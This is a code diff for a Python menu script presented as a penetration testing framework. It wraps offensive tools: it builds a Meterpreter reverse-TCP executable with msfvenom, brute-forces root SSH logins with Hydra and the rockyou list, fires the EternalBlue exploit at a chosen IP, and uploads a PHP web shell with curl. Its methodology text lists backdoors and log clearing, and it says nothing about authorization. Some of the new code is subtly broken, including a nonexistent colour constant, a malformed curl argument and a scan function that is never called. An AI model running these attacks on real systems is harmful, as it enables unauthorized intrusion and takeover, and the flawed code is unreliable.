@@ -11,11 +11,19 @@
 ######################################################################################################################################################################################################################
 
 
-import os
 import subprocess
 import sys
+import os
 import shutil
+from pathlib import Path
 from colorama import Fore, Style
+
+# Helper Function to write output to a report
+def write_to_report(content):
+    report_path = "penetration_test_report.txt"
+    with open(report_path, "a") as report_file:
+        report_file.write(content + "\n")
+    print(f"{Fore.GREEN}Results written to {report_path}{Style.RESET_ALL}")
 
 # Splash Screen
 def display_splash_screen():
@@ -43,183 +51,189 @@ _____________________  ___________                                              
      |__|    )___(    )___(    /____\    /____\    /_____\
     (====)  (=====)  (=====)  (======)  (======)  (=======)
    (______)(_______)(_______)(________)(________)(_________)
+   
+    
     """
-    print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")
+    print(f"{Fore.TEAL}{splash}{Style.RESET_ALL}")
 
-
-# Column Display Helper
-def display_in_columns(options):
-    for i, option in enumerate(options, 1):
-        print(f"[{i}] {option}")
-
+# Columnar Display Helper Function
+def display_in_columns(options, column_count=2):
+    max_length = max(len(option) for option in options)
+    formatted_options = [
+        f"[{index+1}] {option:<{max_length}}" 
+        for index, option in enumerate(options)
+    ]
+    for i in range(0, len(formatted_options), column_count):
+        print("    ".join(formatted_options[i:i + column_count]))
 
 # Check Tool Installation
 def check_tool(tool_name):
-    return subprocess.run(["which", tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0
-
+    return shutil.which(tool_name) is not None
 
 def install_tool(tool_name):
-    print(f"{Fore.YELLOW}Installing {tool_name}...{Style.RESET_ALL}")
-    subprocess.run(["sudo", "apt-get", "install", "-y", tool_name])
+    if sys.platform.startswith("linux"):
+        subprocess.run(["sudo", "apt-get", "install", "-y", tool_name])
+    else:
+        print(f"{Fore.RED}Automatic installation not supported on this OS.{Style.RESET_ALL}")
 
+def check_and_install_tools(tools):
+    for tool in tools:
+        if not check_tool(tool):
+            print(f"{Fore.RED}{tool} is not installed.{Style.RESET_ALL}")
+            choice = input(f"Do you want to install {tool}? (y/n): ").lower()
+            if choice == "y":
+                install_tool(tool)
 
-# Reconnaissance Menu
-def reconnaissance_menu():
-    print(f"\n{Fore.CYAN}Reconnaissance Phase:{Style.RESET_ALL}")
-    options = [
-        "Use Nmap for Network Scanning",
-        "Run OSINT with Shodan",
-        "Use Whois for Domain Info",
-        "Return to Methodology Menu"
-    ]
-    display_in_columns(options)
+# Methodology Layout
+def display_methodology():
+    methodology = """
+    Penetration Testing Methodology:
 
-    try:
-        choice = int(input(f"\n{Fore.YELLOW}Select an action: {Style.RESET_ALL}"))
-        if choice == 1:
-            target = input(f"{Fore.YELLOW}Enter target IP or domain: {Style.RESET_ALL}")
-            if not check_tool("nmap"):
-                install_tool("nmap")
-            subprocess.run(["nmap", "-sV", target])
-        elif choice == 2:
-            target = input(f"{Fore.YELLOW}Enter target domain or IP: {Style.RESET_ALL}")
-            if not check_tool("shodan"):
-                print(f"{Fore.RED}Shodan CLI not installed. Install with `pip install shodan`.{Style.RESET_ALL}")
-                return
-            subprocess.run(["shodan", "host", target])
-        elif choice == 3:
-            target = input(f"{Fore.YELLOW}Enter domain: {Style.RESET_ALL}")
-            if not check_tool("whois"):
-                install_tool("whois")
-            subprocess.run(["whois", target])
-        elif choice == 4:
-            methodology_menu()
-        else:
-            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
-            reconnaissance_menu()
-    except ValueError:
-        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
-        reconnaissance_menu()
+    1. Reconnaissance (Information Gathering)
+        - Network Discovery
+        - OS Fingerprinting
+        - Service Enumeration
 
+    2. Scanning & Enumeration
+        - Vulnerability Scanning
+        - Enumeration of SMB, DNS, HTTP, etc.
+        - Port Scanning with Nmap
 
-# Scanning and Enumeration Menu
-def scanning_menu():
-    print(f"\n{Fore.CYAN}Scanning and Enumeration Phase:{Style.RESET_ALL}")
-    options = [
-        "Scan Ports with Nmap",
-        "Enumerate SMB Shares",
-        "Run Nikto Web Scanner",
-        "Return to Methodology Menu"
-    ]
-    display_in_columns(options)
+    3. Exploitation
+        - Web Application Exploits
+        - Network Exploits
+        - Social Engineering Attacks
 
-    try:
-        choice = int(input(f"\n{Fore.YELLOW}Select an action: {Style.RESET_ALL}"))
-        if choice == 1:
-            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
-            subprocess.run(["nmap", "-p-", target])
-        elif choice == 2:
-            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
-            if not check_tool("smbclient"):
-                install_tool("smbclient")
-            subprocess.run(["smbclient", "-L", f"\\\\{target}"])
-        elif choice == 3:
-            target = input(f"{Fore.YELLOW}Enter target website: {Style.RESET_ALL}")
-            if not check_tool("nikto"):
-                install_tool("nikto")
-            subprocess.run(["nikto", "-h", target])
-        elif choice == 4:
-            methodology_menu()
-        else:
-            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
-            scanning_menu()
-    except ValueError:
-        print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
-        scanning_menu()
+    4. Gaining Access
+        - Brute Force Attacks (SSH, HTTP, SMB, etc.)
+        - Remote Exploits
+        - Web Shells
 
+    5. Maintaining Access
+        - Creating Backdoors
+        - Installing Persistent Agents
+        - Privilege Escalation
 
-# Gaining Access Menu
+    6. Covering Tracks
+        - Log Clearing
+        - History Deletion
+        - Traffic Spoofing
+
+    7. Reporting & Results
+        - Documenting Findings
+        - Recommendations
+        - Executive Summary
+
+    """
+    print(f"{Fore.TEAL}{methodology}{Style.RESET_ALL}")
+
+# Reconnaissance Tools
+def run_reconnaissance_tools():
+    print(f"{Fore.CYAN}Running Reconnaissance Tools...{Style.RESET_ALL}")
+    # Nmap Scan Example
+    target = input(f"{Fore.YELLOW}Enter target IP for Nmap scan: {Style.RESET_ALL}")
+    subprocess.run(["nmap", "-sV", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    write_to_report(f"Nmap scan on {target} completed.")
+    
+# Scanning & Enumeration Tools
+def run_scanning_tools():
+    print(f"{Fore.CYAN}Running Scanning & Enumeration Tools...{Style.RESET_ALL}")
+    # Nikto web scan example
+    target = input(f"{Fore.YELLOW}Enter target URL for Nikto scan: {Style.RESET_ALL}")
+    subprocess.run(["nikto", "-h", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    write_to_report(f"Nikto scan on {target} completed.")
+    
+# Gaining Access Tools
 def gaining_access_menu():
-    print(f"\n{Fore.CYAN}Gaining Access Phase:{Style.RESET_ALL}")
+    print(f"\n{Fore.TEAL}Gaining Access:{Style.RESET_ALL}")
     options = [
-        "Generate Payload with MSFVenom",
-        "Start Metasploit",
-        "Perform Brute Force with Hydra",
-        "Run NTLM Relay Attack",
-        "Return to Methodology Menu"
+        "Launch MSFVenom",
+        "Brute Force with Hydra",
+        "Exploit SMB with EternalBlue",
+        "Web Shell Upload",
+        "Return to Main Menu"
     ]
-    display_in_columns(options)
+    display_in_columns(options, column_count=2)
 
     try:
-        choice = int(input(f"\n{Fore.YELLOW}Select an action: {Style.RESET_ALL}"))
+        choice = int(input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}"))
         if choice == 1:
-            payload = input("Enter payload type (e.g., windows/meterpreter/reverse_tcp): ")
-            lhost = input("Enter LHOST: ")
-            lport = input("Enter LPORT: ")
-            output = input("Enter output file name (e.g., shell.exe): ")
-            subprocess.run(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", output])
+            print(f"{Fore.YELLOW}Launching MSFVenom...{Style.RESET_ALL}")
+            # Example payload generation
+            subprocess.run(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=192.168.1.1", "LPORT=4444", "-f", "exe", "-o", "payload.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            write_to_report("MSFVenom payload created.")
         elif choice == 2:
-            subprocess.run(["msfconsole"])
+            print(f"{Fore.YELLOW}Launching Hydra for brute force...{Style.RESET_ALL}")
+            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
+            subprocess.run(["hydra", "-l", "root", "-P", "/usr/share/wordlists/rockyou.txt", f"ssh://{target}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            write_to_report(f"Brute force attempt on {target} with Hydra completed.")
         elif choice == 3:
-            target = input("Enter target service (e.g., ssh): ")
-            wordlist = input("Enter path to wordlist: ")
-            ip = input("Enter target IP: ")
-            if not check_tool("hydra"):
-                install_tool("hydra")
-            subprocess.run(["hydra", "-l", "root", "-P", wordlist, target, ip])
+            print(f"{Fore.YELLOW}Exploiting SMB with EternalBlue...{Style.RESET_ALL}")
+            target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
+            subprocess.run(["msfconsole", "-q", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target}; run"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            write_to_report(f"EternalBlue exploit on {target} attempted.")
         elif choice == 4:
-            target_ip = input("Enter target IP for NTLM relay: ")
-            if not check_tool("impacket-ntlmrelayx"):
-                print(f"{Fore.RED}NTLMRelayX not found. Install with `sudo apt install impacket`.{Style.RESET_ALL}")
-                return
-            subprocess.run(["impacket-ntlmrelayx", "-t", target_ip])
+            print(f"{Fore.YELLOW}Uploading Web Shell...{Style.RESET_ALL}")
+            # Example of uploading a web shell to a server
+            target_url = input(f"{Fore.YELLOW}Enter target URL: {Style.RESET_ALL}")
+            subprocess.run(["curl", "-X", "POST", "-F", f"file=@webshell.php {target_url}/upload"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            write_to_report(f"Web shell uploaded to {target_url}.")
         elif choice == 5:
-            methodology_menu()
+            main_menu()
         else:
-            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
+            print(f"{Fore.RED}Invalid choice, returning to Gaining Access Menu.{Style.RESET_ALL}")
             gaining_access_menu()
     except ValueError:
         print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
         gaining_access_menu()
 
-
-# Main Methodology Menu
-def methodology_menu():
-    print(f"\n{Fore.CYAN}Penetration Testing Methodology:{Style.RESET_ALL}")
+# Main Menu
+def main_menu():
+    display_splash_screen()
+    print(f"{Fore.TEAL}Welcome to the Penetration Testing Framework!{Style.RESET_ALL}")
     options = [
-        "Reconnaissance",
-        "Scanning and Enumeration",
-        "Gaining Access",
-        "Setup Proxies (Placeholder)",
+        "Penetration Test Methodology",
+        "Reconnaissance & Scanning",
+        "Gaining Access Tools",
+        "Setup Proxies",
         "Maintaining Access (Placeholder)",
         "Covering Tracks (Placeholder)",
         "Exit"
     ]
-    display_in_columns(options)
+    display_in_columns(options, column_count=2)
 
     try:
-        choice = int(input(f"\n{Fore.YELLOW}Select a phase: {Style.RESET_ALL}"))
+        choice = int(input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}"))
         if choice == 1:
-            reconnaissance_menu()
+            display_methodology()
+            main_menu()
         elif choice == 2:
-            scanning_menu()
+            run_reconnaissance_tools()
+            main_menu()
         elif choice == 3:
             gaining_access_menu()
-        elif choice in [4, 5, 6]:
-            print(f"{Fore.RED}This phase is not yet implemented!{Style.RESET_ALL}")
-            methodology_menu()
+        elif choice == 4:
+            print(f"{Fore.YELLOW}Setting up proxies (Feature not implemented yet).{Style.RESET_ALL}")
+            write_to_report("Proxies setup placeholder.")
+            main_menu()
+        elif choice == 5:
+            print(f"{Fore.YELLOW}Maintaining Access (Feature not implemented yet).{Style.RESET_ALL}")
+            write_to_report("Maintaining access placeholder.")
+            main_menu()
+        elif choice == 6:
+            print(f"{Fore.YELLOW}Covering Tracks (Feature not implemented yet).{Style.RESET_ALL}")
+            write_to_report("Covering tracks placeholder.")
+            main_menu()
         elif choice == 7:
-            print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
-            sys.exit()
+            print(f"{Fore.RED}Exiting the script.{Style.RESET_ALL}")
+            sys.exit(0)
         else:
-            print(f"{Fore.RED}Invalid choice!{Style.RESET_ALL}")
-            methodology_menu()
+            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
+            main_menu()
     except ValueError:
         print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
-        methodology_menu()
+        main_menu()
 
-
-# Main Execution
+# Run the program
 if __name__ == "__main__":
-    display_splash_screen()
-    methodology_menu()
+    main_menu()
